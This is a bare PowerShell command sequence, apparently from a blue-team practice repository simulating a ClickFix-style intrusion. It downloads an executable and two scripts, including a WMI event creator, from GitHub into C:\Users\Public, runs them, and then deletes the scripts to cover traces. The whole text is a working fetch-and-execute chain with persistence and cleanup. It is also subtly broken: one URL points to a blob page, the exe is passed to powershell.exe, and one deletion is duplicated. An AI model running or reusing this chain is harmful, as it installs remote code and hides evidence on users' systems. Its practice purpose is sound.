Invoke-WebRequest -Uri "https://github.com/acebird/BlueTeam-Practice/blob/main/clickfix/c723561.exe" -OutFile "C:/Users/Public/c723561.exe"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/acebird/BlueTeam-Practice/refs/heads/main/clickfix/sprint.ps1" -OutFile "C:/Users/Public/sprint.ps1"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/acebird/BlueTeam-Practice/refs/heads/main/clickfix/wmieventcreator.ps1" -OutFile "C:/Users/Public/silly.ps1"


C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\Public\sprint.ps1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\Public\silly.ps1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\Public\c723561.exe

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe rm C:\Users\Public\sprint.ps1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe rm C:\Users\Public\silly.ps1
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe rm C:\Users\Public\silly.ps1
